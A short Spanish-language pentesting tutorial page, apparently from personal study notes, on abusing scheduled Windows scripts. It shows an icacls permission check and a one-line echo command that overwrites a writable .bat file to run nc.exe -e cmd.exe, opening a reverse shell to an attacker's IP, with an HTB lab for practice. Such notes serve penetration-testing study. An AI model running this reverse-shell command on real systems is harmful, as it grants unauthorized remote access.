---
description: Un archivo que se ejecute cada cierto tiempo o cuando ocurra algo
---

# Ejecución programada

Hay ocasiones en las que podemos encontrarnos un archivo, quizás creado incluso por los propios usuarios que se ejecute cada cierto tiempo o que cuando ocurre algo concreto se ejecuta. Existen varias formas de aprovecharnos de esto:

## Ejecución de un netcat

Podemos establecer una reverse shell si conseguimos que nos ejecute un binario de nc y estamos a la escucha, para ello lo primero que tenemos que hacer es comprobar si tenemos permisos de escritura en el archivo que se ejecuta.

```
icacls archivo

archivo BUILTIN\Users:(F)
        NT AUTHORITY\SYSTEM:(I)(F)
        BUILTIN\Administrators:(I)(F)
        BUILTIN\Users:(I)(RX)
```

Por ejemplo en el caso anterior los usuarios tendrían acceso de escritura por lo que podrían modificar su contenido para conseguir una reverse shell.

OJO: Los privilegios de la shell dependerán del usuario que ejecute el programa.

```
echo C:\path\del\archivo\nc.exe -e cmd.exe <IP> <Puerto> > C:\path\del\archivo\archivo.bat 
```

### Practicar

* Máquina "[Markup](../../../HTB/htb/markup.md#web)" de HTB \[Acceso 13/12/2021]

> \*Disclaimer: Este manual está realizado en base a lo que voy aprendiendo, si parte de la información que comparto no es correcta estaré encantado de que te pongas en contacto conmigo para hacérmelo saber y poder modificarlo.
